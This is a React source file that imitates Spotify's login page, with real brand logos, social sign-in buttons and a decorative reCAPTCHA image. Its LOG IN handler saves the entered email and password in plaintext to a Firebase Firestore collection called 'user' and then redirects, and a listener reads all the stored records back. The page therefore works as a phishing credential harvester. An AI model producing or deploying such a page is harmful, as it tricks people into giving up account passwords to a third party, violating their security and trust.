import spotify from './spotify.png';
import facebook from './facebook.png';
import apple from './apple.png';
import google from './google.png';
import recap from './recap.png';
import {Link} from 'react-router-dom'
import firebase from'./firebase';
import {useState} from 'react';
import {useEffect} from 'react';

const Main = () => {
  const[email,setEmail]= useState('');
  const[password,setPassword] = useState('');
  const[user,setUser]=useState([]);

  const ref =firebase.firestore().collection("user");

  function getUser(){
    ref.onSnapshot((querySnapshot)=>{
      const items=[];
      querySnapshot.forEach((doc)=>{
        items.push(doc.data());
      });
      setUser(items);
    })
  }
  useEffect(()=>{
      getUser();
  },[])
   const addUser=(newUser)=>{
     ref
      .doc()
      .set(newUser)
      .catch((error)=>{
        console.log(error)
      })
       
   }
    return ( 
        <>
        <div>
        <img className="spotify" src={spotify} alt="spotify" />
         
         <hr className="lines" style={{position:"relative",top:"27px",color:'white',width:2400,}}></hr>
       <div>
         <p style={{fontFamily:"sans-serif",fontWeight:"bold",position:"relative",bottom:"-55px"}}>To continue, log in to Spotify.</p>
         <a href="https://www.facebook.com/"><button className="button"style={{borderRadius:"30px",border:"1px solid #355a94",height:"50px",position:"relative",top:"50px",width:"460px",color:"white",fontWeight:"bold", fontSize:"15px",fontFamily:"sans-serif",cursor:"pointer",}}>CONTINUE WITH FACEBOOK</button></a>
         <p><img src={facebook} alt="facebook" style={{width:"20px",position:"relative",left:"-130px",top:"-2px"}} /> 
         </p>
         <a href="https://appleid.apple.com/"><button className="buttonapple"style={{borderRadius:"30px",border:"1px solid black",height:"50px",position:"relative",width:"460px",color:"white",fontWeight:"bold", fontSize:"15px",fontFamily:"sans-serif",cursor:"pointer",bottom:"-5px"}}>CONTINUE WITH APPLE</button></a>
         <p><img src={apple} alt="apple" style={{width:"30px",position:"relative",left:"-110px",top:"-53px"}} /> 
         </p>
         <a href="https://accounts.google.com/ServiceLogin/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin"><button className="buttongoogle"style={{borderRadius:"30px",border:"2.2px solid #4a4947",height:"50px",position:"relative",width:"460px",color:"#4a4947",fontWeight:"bold", fontSize:"15px",fontFamily:"sans-serif",cursor:"pointer",bottom:"50px"}}><span>CONTINUE WITH GOOGLE</span></button></a>
         <p><img src={google} alt="google" style={{width:"20px",position:"relative",left:"-117px",top:"-101px"}} /> 
         </p>
         <button className="buttonphone"style={{borderRadius:"30px",border:"2.2px solid #4a4947",height:"50px",position:"relative",width:"460px",color:"#4a4947",fontWeight:"bold", fontSize:"15px",fontFamily:"sans-serif",cursor:"pointer",bottom:"90px"}}><span>CONTINUE WITH PHONE NUMBER</span></button>
       </div>
       <p style={{fontFamily:"sans-serif",fontWeight:"bold",position:"relative",top:"-85px",fontSize:"13px"}}>OR</p>
       <hr style={{width:185,position:"relative",top:"-105px",left:"-118px"}}></hr>
       <hr style={{width:185,position:"relative",top:"-116.5px",right:"-120px"}}></hr>
      <div className="content">
        
        <p className="text" style={{fontFamily:"sans-serif",fontWeight:"bold",position:"relative",top:"-100px",left:"-120px",fontSize:"14.5px"}}>Email address or username</p>
         <input className="input" type=" email" onChange={(e)=>setEmail(e.target.value)} placeholder=" Email address or username" style={{width:"430px",position:"relative",left:"5px",height:"35px",top:"-100px",border:"0.5px solid darkgray"}}></input>       
         <p className="pass"style={{fontFamily:"sans-serif",fontWeight:"bold",position:"relative",top:"-85px",left:"-177px",fontSize:"14.5px"}}>Password</p>
         <input className="password" type="password" placeholder=" Password" onChange={(e)=>setPassword(e.target.value)} id="pwd" style={{width:"430px",position:"relative",left:"5px",height:"35px",top:"-80px",border:"0.5px solid darkgray"}}></input>
      </div>
     <a href="#"><p className="forgot" style={{position:"relative",left:"-138px",top:"-50px",fontFamily:"sans-serif",fontSize:"15px",color:"#4a4947"}}>Forgot your password?</p></a>
     <input className="cbox"type="checkbox"style={{cursor:"pointer",width:"20px",height:"20px",position:"relative",left:"-45px",bottom:"35px"}}></input>
     <label className="rem"style={{fontStyle:"Sans-serif",position:"relative",left:"-30px",bottom:"40px"}}>Remember me</label>
     <Link to="/Homepage"><button className="buttonlog" onClick={()=>addUser({email,password})} style={{border:"0.2px solid",color:"white",borderRadius:"30px",position:"relative",left:"50px",bottom:"45px",fontFamily:"Sans-serif",fontWeight:"bold",fontSize:"15px"}}>LOG IN</button></Link>
     <hr style={{position:"relative",bottom:"25px", width:430}}></hr><br /><br />
     <p style={{position:"relative",bottom:"50px",fontFamily:"Sans-serif",fontWeight:"bold",fontStyle:"bold",fontSize:"18px",right:"10px"}}>Don't have an account?</p>
     <button className="buttongoogle"style={{borderRadius:"30px",border:"2.2px solid #4a4947",height:"50px",position:"relative",width:"460px",color:"#4a4947",fontWeight:"bold", fontSize:"15px",fontFamily:"sans-serif",cursor:"pointer",bottom:"30px",left:"-10px"}}><span>SIGN UP FOR SPOTIFY</span></button>
      
      </div>
      <div>
             <img className="image"src={recap} alt="recaptcha" style={{width:"17%",position:"relative",right:"-819px",top:"-70px"}}></img>
     
     </div>
    
   </>
     );
}
 
export default Main;